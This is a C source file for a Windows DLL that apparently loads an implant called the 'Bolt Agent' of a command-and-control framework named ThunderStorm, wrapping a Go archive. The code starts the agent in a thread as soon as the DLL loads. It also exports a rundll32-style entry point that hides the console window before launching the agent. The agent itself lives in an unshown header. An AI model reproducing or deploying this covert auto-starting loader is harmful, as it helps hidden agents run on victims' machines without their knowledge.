// ThunderStorm Bolt Agent DLL Runner
//  Wraps the Go archive and will control a Bolt Agent

// Windows Xp+
#define WINVER 0x0501
#define _WIN32_WINNT 0x0501
// Windows Vista+
// #define WINVER 0x0600
// #define _WIN32_WINNT 0x0600

#define NOCOMM
#define WIN32_LEAN_AND_MEAN

#include <windows.h>

#define STACK_SIZE 256000000
#define EXPORT __declspec(dllexport)

// Bolt Include (Generated before compile)
#include "bolt.h"

DWORD beginthread() {
    boltAgent(0);
    return 0;
}

EXPORT void initHandle(HWND h, HINSTANCE i, LPSTR a, int s) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, SW_HIDE);
    }
    beginthread();
}

EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
    if (r == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, STACK_SIZE, (LPTHREAD_START_ROUTINE)beginthread, NULL, 0, NULL);
    }
    return TRUE;
}
